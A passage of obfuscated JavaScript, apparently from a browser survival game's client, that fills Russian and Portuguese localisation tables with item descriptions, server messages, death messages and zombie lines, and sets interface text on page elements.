			ΔⵠΔ[ᐃᐃ.ⵠⵠⵠᐃⲆ] = ["Алмазная Дверь", "Для роскошного дома", "Прочность: 2500"];
			ΔⵠΔ[ᐃᐃ.ⲆⲆⲆⲆⲆ] = ["Аметистовая Дверь", "Ваш дом в безопасности?", "Прочность: 3000"];
			ΔⵠΔ[ᐃᐃ.ⵠΔⵠΔᐃ] = ["Печь", "Согревает", "Тратит дерево каждые 5 секунд", ⵠ[539]];
			ΔⵠΔ[ᐃᐃ.ΔΔⲆᐃᐃ] = ["Мельница", "Может сделать муку из пшеницы", "Требует 5 секунд для получения муки", "Даёт очки при работе", ⵠ[190]];
			ΔⵠΔ[ᐃᐃ.ⲆⵠᐃⲆⵠ] = ["Хлебная Печь", "Позволяет готовить хлеб из муки", "Требует 10 секунд для получения хлеба", "Даёт очки при работе", ⵠ[190]];
			ΔⵠΔ[ᐃᐃ.ⵠⵠᐃⲆⵠ] = ["Камень Воскрешения", "Это магия", "Воскрешает вас, если вы призрак", "Вы потеряете своё оружие", "Прочность: 200"];
			ΔⵠΔ[ⲆⲆΔ.ᐃⵠⲆΔⲆⲆⲆ] = "Вы не можете зайти на этот сервер";
			ΔⵠΔ[ⲆⲆΔ.ⲆⲆᐃⲆΔΔᐃ] = "Выгнаны: ";
			ΔⵠΔ[ⲆⲆΔ.ΔᐃⵠⵠΔⲆⲆ] = "Ваш ключ уже используется кем-то";
			ΔⵠΔ[ⲆⲆΔ.ᐃᐃⵠⵠΔᐃⵠ] = "Ваш ключ неправильный";
			ΔⵠΔ[ⲆⲆΔ.ⵠΔΔⲆΔᐃⵠ] = "У вас старая версия, вам нужно очистить кеш";
			ΔⵠΔ[ⲆⲆΔ.ᐃΔΔΔⵠⵠᐃ] = "Ресурсов больше нет";
			ΔⵠΔ[ⲆⲆΔ.ᐃⲆᐃⲆⵠⲆᐃ] = "Вы выжили 1 день";
			ΔⵠΔ[ⲆⲆΔ.ΔⵠⲆΔⵠᐃΔ] = "Вы выжили ";
			ΔⵠΔ[ⲆⲆΔ.ⲆⲆΔΔⲆᐃᐃ] = " дней";
			ΔⵠΔ[ⲆⲆΔ.ᐃΔᐃⲆᐃⵠⵠ] = "Вы умерли ;-;";
			ΔⵠΔ[ⲆⲆΔ.ΔΔⵠⵠⲆⲆᐃ] = "Сервер не может найти точку спавна! Спамьте кнопку играть!";
			ΔⵠΔ[ⲆⲆΔ.ⵠᐃⵠⲆⵠΔΔ] = "Сервер заполнен! Спамьте кнопку играть!";
			ΔⵠΔ[ⲆⲆΔ.EMPTY] = "Ресурсы закончились";
			ΔⵠΔ[ⲆⲆΔ.ΔᐃⲆᐃⲆⲆⲆ] = "Инвентарь заполнен (правая кнопка мыши для удаления предметов)";
			ΔⵠΔ[ⲆⲆΔ.ΔᐃΔⲆᐃⲆⲆ] = " умер";
			ΔⵠΔ[ⲆⲆΔ.ⲆⲆⲆⲆᐃᐃᐃ] = "Это не тот инструмент";
			ΔⵠΔ[ⲆⲆΔ.ΔⵠⵠⲆΔⵠᐃ] = "Вы вошли в команду";
			ΔⵠΔ[ⲆⲆΔ.ⲆⵠΔⵠᐃᐃΔ] = "Вы умерли";
			ΔⵠΔ[ⲆⲆΔ.ⵠⲆΔᐃⲆⵠΔ] = " вошёл в команду";
			ΔⵠΔ[ⲆⲆΔ.ᐃᐃⲆᐃᐃΔⲆ] = "Ваша команда была разрушена";
			ΔⵠΔ[ⲆⲆΔ.ΔΔᐃᐃⵠⵠΔ] = "Вы покинули команду";
			ΔⵠΔ[ⲆⲆΔ.ⵠⵠⵠⵠⵠⵠᐃ] = " покинул команду";
			ΔⵠΔ[ⲆⲆΔ.ᐃⵠᐃΔⲆ] = "Кто-то использует ваш токен :>";
			ΔⵠΔ[ⲆⲆΔ.ᐃⵠᐃⲆⲆⵠⲆ] = "Выберите сервер";
			ΔⵠΔ[ⲆⲆΔ.ⵠⲆⵠⵠⲆ] = "игроков";
			ΔⵠΔ[ⲆⲆΔ.ⲆⲆⲆᐃⵠⲆⲆ] = "игроков всего";
			ΔⵠΔ[ⲆⲆΔ.ⲆⵠΔⵠᐃΔᐃ] = "игроков в этом режиме";
			ΔⵠΔ[ⲆⲆΔ.ⵠⲆⵠⲆⲆᐃᐃ] = "Скоро...";
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[505]).placeholder = "Имя";
			ᐃᐃΔᐃ[0] = ["Вы были убиты без причины"];
			ᐃᐃΔᐃ[ᐃⲆᐃ] = ["Вы умерли от голода, как название игры подразумевает это"];
			ᐃᐃΔᐃ[2] = ["Вы замерзли до смерти. Так грустно", "У вас гипотермия. В следующий раз, постарайтесь быть рядом с огнём."];
			ᐃᐃΔᐃ[3] = ["Игрок убил тебя и сказал 'стань лучше.'", "Ты был убит игроком. Не волнуйся, этот игрок тоже умрёт, в конце концов."];
			ᐃᐃΔᐃ[ⲆᐃᐃΔ] = ["Вы стояли слишком близко к огню и сгорели. Плохая идея.", "Ты умер от огня, он причинил вам боль. Напишите историю насчёт этого."];
			ᐃᐃΔᐃ[5] = ["Ваше тело станет гнездом для яиц паука", "Паук убил вас. По крайней мере это был не кролик."];
			ᐃᐃΔᐃ[6] = ["Волк больше не будет голодать после того, как наелся вами", "Они не собаки. Волки не любят ласкаться."];
			ᐃᐃΔᐃ[7] = ["Лиса была слишком быстрой для вас", "Лиса превратила тебя в ящик. С каких пор животные обладают магическими способностями?"];
			ᐃᐃΔᐃ[8] = ["Медведь просто хотел обнять тебя.", "Медведь был слишком грустным. Мне не жаль."];
			ᐃᐃΔᐃ[9] = ["Вы были сожжены драконом. Так грустно.", "Вы были сплющены драконом. Быть раздавленным - это ужасный способ умереть."];
			ᐃᐃΔᐃ[10] = ["Вы прыгнули в стену с шипами. Плохая идея...", "Вы были убиты стеной с шипами. Большинство людей достаточно разумны, чтобы не касаться острых вещей."];
			ᐃᐃΔᐃ[11] = ["Даже призрак может умереть.", "Вы не смогли воскреснуть. Это игра, и вы можете возвращаться к жизни после смерти, так что..."];
			ᐃᐃΔᐃ[ⲆΔⲆⲆᐃ] = ["Бактерия из вашей сырой пищи убила вас. Эта игра безусловно сложна.", "Вы убили сырую пищу. Она тоже тебя убила."];
			ᐃᐃΔᐃ[ⵠΔΔⲆΔΔΔ] = ["Вы умерли от жажды. Лучше пить собственную мочу."];
			ᐃᐃΔᐃ[ᐃΔᐃⲆⲆ] = ["Знаешь ли ты, что у голодающих рот всегда под водой, когда они плавают? Теперь ты знаешь."];
			ᐃᐃΔᐃ[Δᐃᐃᐃᐃⵠⵠ] = ["Не волнуйся, пиранья сочла тебя вкусным.", "Веселый факт: Пираньи едят людей. В том числе тебя."];
			ᐃᐃΔᐃ[ⵠᐃⲆᐃᐃΔⵠ] = ["LapaMauve не планировал, что ты убьёшь кракена", "Крак! Кракен сломал твой череп."];
			ᐃᐃΔᐃ[ⵠᐃᐃΔᐃ] = ["Твоя кожа разваливается, солнце убило тебя"];
			ᐃᐃΔᐃ[ⲆⲆᐃⲆΔᐃΔ] = ["Чеснок, хранящийся в твоих карманах сварил твой мозг."];
			ᐃᐃΔᐃ[ᐃⲆᐃⵠⵠ] = ["Не стоит стоять рядом с чесночным зубком, когда вы вампир."];
			ᐃᐃΔᐃ[ⵠⵠΔΔᐃ] = ["Вы вампир, Вы ели чеснок, чего вы ожидали?"];
			ᐃᐃΔᐃ[21] = ["Ваше тело застревает в шипах, когда вы пытаетесь убежать, ваша кожа отрывается, и ваше сердце перестает биться."];
			ⲆⲆΔΔⲆ = ⵠ[170];
			ΔⵠᐃⲆⲆⵠⲆ = ["Uuunnnggg... Я голоден", "Нужны твои мозги Uuunnnggg...", "Свежее мясо здесь... Uuunnnggg", "Uuunnnggg... Ты вкусный", ⵠ[200], "Еда… Uuunnnggg...", "Я чувствую запах крови... Uuunnnggg"]
		};
		const ⵠΔⵠⵠᐃ = ⵠᐃΔᐃᐃ;
		var ⲆΔᐃⵠΔΔᐃ = function() {
			ΔⵠΔ[ᐃᐃ.ⲆᐃΔᐃᐃ] = [ⵠ[207]];
			ᐃᐃΔᐃ[22] = [ⵠ[41]];
			ΔⵠΔ[ᐃᐃ.ΔⵠⲆΔⵠ] = [ⵠ[169], ⵠ[59], ⵠ[57]];
			ΔⵠΔ[ⲆⲆΔ.ᐃⲆΔᐃᐃⵠᐃ] = ⵠ[251];
			ΔⵠΔ[ⲆⲆΔ.ΔⵠⵠᐃᐃΔⵠ] = ⵠ[335];
			ΔⵠΔ[ⲆⲆΔ.ΔⵠᐃⲆⲆⲆΔ] = ⵠ[462];
			ΔⵠΔ[ⲆⲆΔ.ⲆᐃΔᐃᐃᐃⵠ] = ⵠ[270];
			ΔⵠΔ[ⲆⲆΔ.POINTS] = ⵠ[250];
			ΔⵠΔ[ⲆⲆΔ.ⵠΔΔᐃᐃᐃⵠ] = ⵠ[165];
			ΔⵠΔ[ⲆⲆΔ.ⲆᐃⵠⵠΔΔΔ] = ⵠ[203];
			ΔⵠΔ[ⲆⲆΔ.ⲆᐃᐃⵠⲆⲆᐃ] = ⵠ[368];
			ΔⵠΔ[ⲆⲆΔ.ΔΔⲆΔⲆᐃⲆ] = ⵠ[538];
			ΔⵠΔ[ⲆⲆΔ.ΔⲆⲆΔᐃⲆᐃ] = ⵠ[208];
			ΔⵠΔ[ᐃᐃ.ᐃΔΔΔⵠ] = [ⵠ[188], ⵠ[439], ⵠ[134]];
			ΔⵠΔ[ᐃᐃ.ᐃᐃΔⲆΔ] = [ⵠ[518], ⵠ[7], ⵠ[449], ⵠ[492]];
			ΔⵠΔ[ᐃᐃ.ΔⲆⲆⲆⲆ] = [ⵠ[287], ⵠ[194], ⵠ[393], ⵠ[489], ⵠ[68], ⵠ[388]];
			ΔⵠΔ[ᐃᐃ.ⲆⲆⲆⲆΔ] = [ⵠ[295], ⵠ[577], ⵠ[527], ⵠ[425], ⵠ[463]];
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[219])[ΔᐃⲆⵠⲆⵠΔ[290]] = ⵠ[249];
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[546])[ΔᐃⲆⵠⲆⵠΔ[290]] = ⵠ[286];
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[185])[ΔᐃⲆⵠⲆⵠΔ[290]] = ⵠ[220];
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[136])[ΔᐃⲆⵠⲆⵠΔ[290]] = ⵠ[355];
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[579])[ΔᐃⲆⵠⲆⵠΔ[290]] = ⵠ[485];
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[327])[ΔᐃⲆⵠⲆⵠΔ[290]] = ⵠ[441];
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[322])[ΔᐃⲆⵠⲆⵠΔ[290]] = ⵠ[390];
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[514])[ΔᐃⲆⵠⲆⵠΔ[290]] = ⵠ[296];
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[334])[ΔᐃⲆⵠⲆⵠΔ[290]] = ⵠ[242];
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[233])[ΔᐃⲆⵠⲆⵠΔ[290]] = ⵠ[217];
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[179])[ΔᐃⲆⵠⲆⵠΔ[290]] = ⵠ[230];
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[109])[ΔᐃⲆⵠⲆⵠΔ[290]] = ⵠ[45];
			for (var ⵠᐃ = 0; ⵠᐃ < 7; ⵠᐃ++) document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[ⵠⲆᐃⵠⲆᐃΔ] + ⵠᐃ)[ΔᐃⲆⵠⲆⵠΔ[290]] = ⵠ[451];
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[487])[ΔᐃⲆⵠⲆⵠΔ[290]] = ⵠ[309];
			ΔⵠΔ[ᐃᐃ.ᐃⲆᐃΔᐃ] = ["mão"];
			ΔⵠΔ[ᐃᐃ.ⲆⵠΔⲆᐃ] = ["terra", "está sujo!"];
			ΔⵠΔ[ᐃᐃ.ΔⲆⲆΔⵠ] = ["areia", "entrou nos meus olhos!"];
			ΔⵠΔ[ᐃᐃ.ⵠⲆⲆᐃ] = ["madeira", "você não pode pegar o suficiente disso!"];
			ΔⵠΔ[ᐃᐃ.ᐃᐃΔⲆ] = ["pedra", "também chamado rocha"];
			ΔⵠΔ[ᐃᐃ.ΔⲆⵠⵠ] = ["ouro", "seja generoso, dê para outros"];
			ΔⵠΔ[ᐃᐃ.ΔⲆᐃΔ] = ["diamante", "o que você irá fazer com isso?"];
			ΔⵠΔ[ᐃᐃ.ⲆⵠΔⲆ] = ["ametista", "é mauve como lapa"];
			ΔⵠΔ[ᐃᐃ.ⵠᐃⲆⵠᐃ] = ["farinha", "usada na cozinha"];
			ΔⵠΔ[ᐃᐃ.ΔⵠⲆᐃᐃ] = ["biscoito", "biscoito da vovó", "comida: 50"];
			ΔⵠΔ[ᐃᐃ.ⲆΔΔⲆᐃ] = ["bolo", "bolo dos sonhos para gourmets", ⵠ[396]];
			ΔⵠΔ[ᐃᐃ.ⵠⲆᐃⲆⵠ] = ["carne crua", "você pode cozinhar na fogueira", "envenenamento por comida: 10", "comida: 15"];
			ΔⵠΔ[ᐃᐃ.ⲆᐃⲆⲆⲆ] = ["carne assada", "um mal passado, por favor", "comida: 35"];
			ΔⵠΔ[ᐃᐃ.ᐃΔΔΔΔ] = ["peixe cru", "eu acho que ainda está vivo", "causa envenenamento por comida: 10", "comida: 18"];
			ΔⵠΔ[ᐃᐃ.Ⲇⵠᐃᐃⵠ] = ["peixe assado", "com limão é perfeito", "comida: 35"];
			ΔⵠΔ[ᐃᐃ.ⲆΔⵠΔⲆ] = ["pão", "um excelente pão francês", "é a moeda do mercado", "comida: 15"];
			ΔⵠΔ[ᐃᐃ.ΔⵠⲆⵠⵠ] = ["sanduíche", "saboroso com rissol de krabby", ⵠ[396]];
			ΔⵠΔ[ᐃᐃ.ⵠⲆⵠᐃⲆ] = ["doces", "apenas para crianças!", ⵠ[396]];
			ΔⵠΔ[ᐃᐃ.ΔᐃⲆⵠⲆ] = ["cana-de-açúcar", "prove, é delicioso!", ⵠ[396]];
			ΔⵠΔ[ᐃᐃ.ᐃⲆⲆⲆᐃ] = ["pisca-pisca", "decoração perfeita de telhado"];
			ΔⵠΔ[ᐃᐃ.ⵠΔⵠᐃΔ] = ["sementes de berries", "cresce como berrie", "nasce em: 2min", "cresce em: 55s", "precisa de água em: 3min 20s", ⵠ[75], "tempo de vida: 8 dias"];
			ΔⵠΔ[ᐃᐃ.ⵠⲆΔⲆⲆ] = ["berry", "Berry saborosa!", "comida: 10"];
			ΔⵠΔ[ᐃᐃ.ⲆⵠⲆΔⲆ] = ["semente de trigo", "cresce como trigo", "nasce em: 2min", "cresce em: 16s", "precisa de água em: 2min", ⵠ[75], "tempo de vida: 8 days"];
			ΔⵠΔ[ᐃᐃ.ⵠⲆⲆⲆⵠ] = ["planta selvagem", "vira farinha quando coloca em um moinho de vento"];
			ΔⵠΔ[ᐃᐃ.ⵠⵠΔⲆⵠ] = ["semente de abóbora", "cresce como abóbora", "nasce em: 2min 40s", "cresce em: 2min", "precisa de água em: 2min", ⵠ[75], "tempo de vida: 8 dias"];
			ΔⵠΔ[ᐃᐃ.ⲆⲆⵠΔΔ] = ["abóbora", "é a lembrança do halloween", "comida: 30"];
			ΔⵠΔ[ᐃᐃ.ⵠⲆⲆⵠⲆ] = ["semente de alho", "muito perigoso para vampiros", "dano: 20", "nassce: 4min", "cresce em: 1min 10s", "precisa de água em: 1min 40s", ⵠ[75], "tempo de vida: 8 dias"];
			ΔⵠΔ[ᐃᐃ.ⲆΔⵠΔⵠ] = ["alho", "cura você e reduz o frio", "comida: 14", "cura ao longo do tempo: 30", "efeito: 1"];
			ΔⵠΔ[ᐃᐃ.ⵠⵠᐃⵠⲆ] = ["semente de mato de espinhos", "pode dar dano nos seus inimigos", "dano: 20", "nasce em: 4min", "cresce em: 15s", "precisa de água em: 3min", ⵠ[380], "tempo de vida: 8 days"];
			ΔⵠΔ[ᐃᐃ.ᐃⵠᐃΔΔ] = ["mato de espinhos", "pica!"];
			ΔⵠΔ[ᐃᐃ.ⵠᐃΔⲆⲆ] = ["pote", "sério, use isso", "com esse GMO fertilize suas plantas", "vai crescer mais rápido e com menos água", ⵠ[153]];
			ΔⵠΔ[ᐃᐃ.ᐃⵠⲆⲆΔ] = ["gelo", "útil para fazer bolo e água"];
			ΔⵠΔ[ᐃᐃ.ΔΔᐃⲆΔ] = ["chave inglesa", "para reparar portas, muros e muros com espinho", ⵠ[491]];
			ΔⵠΔ[ᐃᐃ.ΔᐃᐃᐃΔ] = ["pele de lobo", "cachorro? mas onde está o cachorro?!"];
			ΔⵠΔ[ᐃᐃ.ⲆᐃⵠⲆᐃ] = ["pele de coelho", "o coelho era tão fofo..."];
			ΔⵠΔ[ᐃᐃ.ΔⲆⵠᐃⲆ] = ["pele pura", "você é uma fábrica de pão"];
			ΔⵠΔ[ᐃᐃ.ΔⲆΔⵠΔ] = ["pele negra", "você está pronto para fazer algo errado"];
			ΔⵠΔ[ᐃᐃ.ᐃⲆΔⲆⲆ] = ["pele de inverno", "ele só queria um abraço"];
			ΔⵠΔ[ᐃᐃ.ⲆⲆⲆᐃᐃ] = ["escala", "é pequeno como peixe!"];
			ΔⵠΔ[ᐃᐃ.ᐃⲆᐃⲆᐃ] = ["pele do kraken", "você não está com medo?"];
			ΔⵠΔ[ᐃᐃ.ⵠⲆΔᐃΔ] = ["fogueira", "esquenta você!", "durabilidade: 150", "tempo de vida: 2min"];
			ΔⵠΔ[ᐃᐃ.ⲆⵠⵠⵠⲆ] = ["fogueira grande", "te esquenta por mais tempo!", "durabilidade: 400", "tempo de vida: 6min"];
			ΔⵠΔ[ᐃᐃ.ᐃⲆⲆΔᐃ] = ["mesa de trabalho", "muito útil para fazer todos os objetos"];
			ΔⵠΔ[ᐃᐃ.ᐃᐃᐃΔΔ] = ["linha", "usada para fazer chapéus e mochila"];
			ΔⵠΔ[ᐃᐃ.ΔΔΔΔᐃ] = ["linha de diamante", "usada para fazer chapéus especiais"];
			ΔⵠΔ[ᐃᐃ.ⵠⵠⵠᐃⵠ] = ["baú", "permite que você guarde itens", "durabilidade: 500"];
			ΔⵠΔ[ᐃᐃ.ΔΔⵠᐃᐃ] = ["espada de madeira", "isso funciona?", "dano: 12", "dano em construções: 4"];
			ΔⵠΔ[ᐃᐃ.ⲆᐃⵠΔᐃ] = ["espada de pedra", "seja legal com outros", "dano: 19", "dano em construções: 6"];
			ΔⵠΔ[ᐃᐃ.ⵠᐃⲆⵠΔ] = ["espada de ouro", "rei da floresta", "dano: 22", "dano em construções: 7"];
			ΔⵠΔ[ᐃᐃ.ᐃΔⵠᐃⵠ] = ["espada de diamante", "você pode sentir o poder", "dano: 24", "dano em construções: 8"];
			ΔⵠΔ[ᐃᐃ.ⲆᐃⲆⲆΔ] = ["espada de pirata", "AYYYYY!", "alcança mais distância que a espada normal", "dano: 24", "dano em construções: 8"];
			ΔⵠΔ[ᐃᐃ.ⵠⵠᐃⲆⲆ] = ["espada de ametista", "mauve é a cor mais bonita do mundo", "dano: 27", "dano em construções: 9"];
			ΔⵠΔ[ᐃᐃ.ᐃⲆⲆᐃⲆ] = ["espada do dragão", "sem piedade!", "dano: 30", "dano em construções: 10"];
			ΔⵠΔ[ᐃᐃ.ⲆⲆⵠᐃⵠ] = ["lança do dragão", "mate todos eles!", "dano: 22", "dano em construções: 6"];
			ΔⵠΔ[ᐃᐃ.ΔᐃⲆΔⲆ] = ["picareta de madeira", "pode coletar apenas madeira e pedra", "dano: 1"];
			ΔⵠΔ[ᐃᐃ.ⵠⲆΔᐃⵠⲆᐃΔΔ] = ["picareta de pedra", "pode coletar madeira, pedra e ouro", ⵠ[491]];
			ΔⵠΔ[ᐃᐃ.ΔΔⲆⵠⲆ] = ["picareta de ouro", "pode coletar diamante", "dano: 3", ⵠ[447]];
			ΔⵠΔ[ᐃᐃ.ⵠⲆⲆΔⲆ] = ["picareta de diamante", "pode coletar tudo", "dano: 4", ⵠ[447]];
			ΔⵠΔ[ᐃᐃ.ⵠⲆⵠΔᐃ] = ["picareta de ametista", "pode coletar tudo, parece fantastico!", "dano: 5", ⵠ[447]];
			ΔⵠΔ[ᐃᐃ.ΔⵠⲆΔⲆ] = ["martelo de pedra", ⵠ[189], "não funciona bem no diamante e na ametista", ⵠ[491], "dano em construções: 20"];
			ΔⵠΔ[ᐃᐃ.ⲆᐃⵠΔⲆ] = ["martelo de ouro", ⵠ[189], "não funciona bem na ametista", "dano: 3", "dano em construções: 30"];
			ΔⵠΔ[ᐃᐃ.ᐃᐃᐃⲆⵠ] = ["martelo de diamante", ⵠ[189], "dano: 4", "dano em construções: 40"];
			ΔⵠΔ[ᐃᐃ.ⲆⵠⵠⲆⵠ] = ["martelo de ametista", ⵠ[189], "dano: 5", "dano em construções: 50"];
			ΔⵠΔ[ᐃᐃ.ᐃⵠⵠⵠᐃ] = ["super martelo", "você planeja destruir o mundo?", "dano: 12", "dano em construções: 70"];
			ΔⵠΔ[ᐃᐃ.ⲆⲆⵠΔⲆ] = ["lança de madeira", "parece um graveto de madeira mas pica.", "dano: 10", "dano em construções: 2"];
			ΔⵠΔ[ᐃᐃ.ΔⵠΔΔⲆ] = ["lança de pedra", "o começo da evolução!", "dano: 14", "dano em construções: 4"];
			ΔⵠΔ[ᐃᐃ.ⵠⵠⲆΔⲆ] = ["lança de ouro", "cuidado, pica!", "dano: 15", "dano em construções: 5"];
			ΔⵠΔ[ᐃᐃ.ΔᐃΔΔΔ] = ["lança de diamante", "você está pronto para matar um dragão", "Dano: 17", "dano em construções: 5"];
			ΔⵠΔ[ᐃᐃ.ⲆⲆΔᐃΔ] = ["lança de ametista", "dragões não te amedrontam", "Dano: 18", "dano em construções: 6"];
			ΔⵠΔ[ᐃᐃ.ΔⵠⵠΔᐃ] = ["pá de pedral", ⵠ[101], ⵠ[450], ⵠ[491]];
			ΔⵠΔ[ᐃᐃ.ΔΔⲆⵠΔ] = ["pá de ouro", ⵠ[101], ⵠ[450], "dano: 3", ⵠ[447]];
			ΔⵠΔ[ᐃᐃ.ⵠᐃΔΔᐃ] = ["pá de diamante", ⵠ[101], ⵠ[450], "dano: 4", ⵠ[447]];
			ΔⵠΔ[ᐃᐃ.ⵠᐃᐃⲆΔ] = ["pá de ametista", ⵠ[101], ⵠ[450], "dano: 5", ⵠ[447]];
			ΔⵠΔ[ᐃᐃ.ᐃⵠⵠⲆΔ] = ["capacete de madeira", "melhor que nada", "defesa de jogadores: 1", "defesa de animais: 4"];
			ΔⵠΔ[ᐃᐃ.ⵠΔΔᐃⲆ] = ["capacete de pedra", "você está pronto para a batalha!", "defesa de jogadores: 2", "Animals Defense: 8"];
			ΔⵠΔ[ᐃᐃ.ⲆⵠⲆⵠΔ] = ["capacete de ouro", "AKA o capacete dos selvagens", "defesa de jogadores: 4", "defesa de animais: 13"];
			ΔⵠΔ[ᐃᐃ.ᐃΔⲆⲆⲆ] = ["capacete de diamante", "não se precipite tanto", "defesa de jogadores: 5", "defesa de animais: 19"];
			ΔⵠΔ[ᐃᐃ.ⲆⵠΔⲆΔ] = ["capacete de ametista", "você não tem medo de mais nada", "defesa de jogadores: 6", "defesa de animais: 23"];
			ΔⵠΔ[ᐃᐃ.ⵠᐃⲆⲆⵠ] = ["capacete do dragão", "você vai conquistar o mundo", "defesa de jogadores: 8", "defesa de animais: 27"];
			ΔⵠΔ[ᐃᐃ.ΔⵠⲆⵠΔ] = ["chapéu de explorador", "animais não vão te atacar", "mas não faça barulho!", "quente fora da água"];
			ΔⵠΔ[ᐃᐃ.ΔⵠᐃⲆⲆ] = ["gorro de natal", "Oh, oh, oh, feliz natal", "quente fora da água e neve"];
			ΔⵠΔ[ᐃᐃ.ΔⲆΔⵠⵠ] = ["chapéu de elfo", "não deixe-se ser explorado, seu pequeno elfo de neve!", "quente fora da água e neve"];
			ΔⵠΔ[ᐃᐃ.ⲆⵠᐃΔΔ] = ["capuz", "você é um trapaceiro", "você pode roubar alguém apenas se", "1) é de noite", "2)você não está segurando nada", "3) se você n foi tocado por 5 segundos", "4) você não está perto de uma fogueira", "5) seu alvo não está com equipamento camponês", "quente fora da água e na neve"];
			ΔⵠΔ[ᐃᐃ.ΔⵠᐃⲆⵠ] = ["protetor de orelhas", "algum tipo de chapka pequena.", "quente fora da água e neve"];
			ΔⵠΔ[ᐃᐃ.ᐃᐃⲆⵠᐃ] = [ⵠ[308], "também chamado de casaco.", "esquenta fora da água e na neve", "muito quente"];
			ΔⵠΔ[ᐃᐃ.ⲆⵠΔᐃⲆ] = ["Chapéu de inverno", "Muito confortável", "Muito quente"];
			ΔⵠΔ[ᐃᐃ.ⲆⲆΔⲆᐃ] = ["túnica", "suas plantas crescem rápido", "quente fora da água e na neve"];
			ΔⵠΔ[ᐃᐃ.ΔᐃᐃΔᐃ] = ["capuz de inferno", "você só pode roubar alguém se", "é de noite", "-você não está segurando nada", "- se você não foi tocado por 4 segundos", "- você não está perto de uma fogueira", "-seu alvo não está com equipamento de camponês de inverno", "esquenta fora da água e na neve"];
			ΔⵠΔ[ᐃᐃ.ᐃΔⲆᐃⲆ] = ["camponês de inverno", "suas plantas crescem rápido", "quente fora da água e na neve"];
			ΔⵠΔ[ᐃᐃ.ᐃⲆΔΔⵠ] = ["máscara de mergulho", "você é rápido na água", "quente na água", "defesa de jogadores: 2, defesa de animais: 8"];
			ΔⵠΔ[ᐃᐃ.ΔⵠᐃΔⲆ] = ["super máscara de mergulho", "você é muito rápido na água", "quente na água", ⵠ[99]];
			ΔⵠΔ[ᐃᐃ.ⵠⵠⵠΔⵠ] = ["esfera do dragão", "dado na questt"];
			ΔⵠΔ[ᐃᐃ.ⵠΔⲆⲆᐃ] = ["coração de dragão", "torna você num fantasmas na morte!", "você é um fantasma por 60 segundos", "ache uma pedra da ressurreição"];
			ΔⵠΔ[ᐃᐃ.ΔⲆⵠᐃⵠ] = ["pedra verde", "você não vai trapacear, promete?"];
			ΔⵠΔ[ᐃᐃ.ΔᐃⲆᐃᐃ] = ["pedra laranja", "apenas um pirata de verdade pode achar-lo!"];
			ΔⵠΔ[ᐃᐃ.ᐃᐃΔⵠΔ] = ["pedra azul", "para pessoas muito gentis"];
			ΔⵠΔ[ᐃᐃ.Ⲇⵠᐃⵠⵠ] = ["coroa verde", "você se regenera muito rápido", "regenera ao longo do tempo: 40", ⵠ[99]];
			ΔⵠΔ[ᐃᐃ.ᐃΔⵠⲆⲆ] = ["coroa laranja", "de repente você se sente muito sortudo", ⵠ[99]];
			ΔⵠΔ[ᐃᐃ.ΔᐃᐃΔΔ] = ["coroa azul", "quando você morrer, você vira um fantasma", "você perderá sua arma", ⵠ[99]];
			ΔⵠΔ[ᐃᐃ.ΔⵠⵠⵠΔ] = ["balde", "útil para encher um poço", "um balde equivale a doze garrafas"];
			ΔⵠΔ[ᐃᐃ.Δⵠⵠⵠⵠ] = ["balde vazio", "você precisa encher esse balde perto de uma fonte de água"];
			ΔⵠΔ[ᐃᐃ.ⵠⲆᐃᐃᐃ] = ["garrafa", "permite que você beba água em qualquer lugar", "água: 50"];
			ΔⵠΔ[ᐃᐃ.ᐃᐃⲆⲆᐃ] = ["garrafa vazia", "você pode encher essa garrafa perto de uma fonte de água"];
			ΔⵠΔ[ᐃᐃ.ⵠᐃⲆᐃⵠ] = ["regador vazio", "você deve enche-lo com uma fonte de água para usa-lo"];
			ΔⵠΔ[ᐃᐃ.ⵠⲆⲆⵠⵠ] = ["regador", "permite regar as plantas", "dano: 1"];
			ΔⵠΔ[ᐃᐃ.ⵠᐃᐃⵠ] = ["mochila", "mais espaço para seus itens!"];
			ΔⵠΔ[ᐃᐃ.ⵠΔⵠΔⲆ] = ["papel", "usado para fazer o livro"];
			ΔⵠΔ[ᐃᐃ.ⵠⵠⲆⵠⲆ] = ["livro", "permite reduzir consideradamente o tempo de construções", "mas precisa está equipado para fucionar", "dano: 1"];
			ΔⵠΔ[ᐃᐃ.ΔΔⵠⵠᐃ] = ["bandagem", "recupera sua vida mais rapidamente", "Heal over time: 30", "Effect: 5"];
			ΔⵠΔ[ᐃᐃ.ΔΔΔⵠᐃ] = ["fechadura", "permite você trancar seu baú"];
			ΔⵠΔ[ᐃᐃ.ΔⵠΔⵠΔ] = ["chave", "permite destrancar um baú"];
			ΔⵠΔ[ᐃᐃ.ⲆΔᐃⲆᐃ] = [ⵠ[534], "permite você criar um time", "compartilha portas e baús", "edifício prejudicial não quer machucar seu amigo"];
			ΔⵠΔ[ᐃᐃ.ΔⲆΔⲆᐃ] = ["ponte", "muito útil na água", "permite você beber sem se afogar", "anda rápido na água"];
			ΔⵠΔ[ᐃᐃ.ᐃⵠᐃⲆᐃ] = ["placa", "deixe uma mensagem para outros", "durabilidade: 200"];
			ΔⵠΔ[ᐃᐃ.ⵠΔⲆᐃⵠ] = ["telhado", "esconde você um pouco e te esquenta!"];
			ΔⵠΔ[ᐃᐃ.ΔⲆᐃΔⵠ] = ["poço", "permite encher garrafas", ⵠ[380]];
			ΔⵠΔ[ᐃᐃ.ⲆΔΔⵠᐃ] = ["muro de madeira", "você sabia que o muro dança?", ⵠ[380]];
			ΔⵠΔ[ᐃᐃ.ΔⵠΔⲆⲆ] = ["muro de pedra", "é um pocu mais sério.", "durabilidade: 1500"];
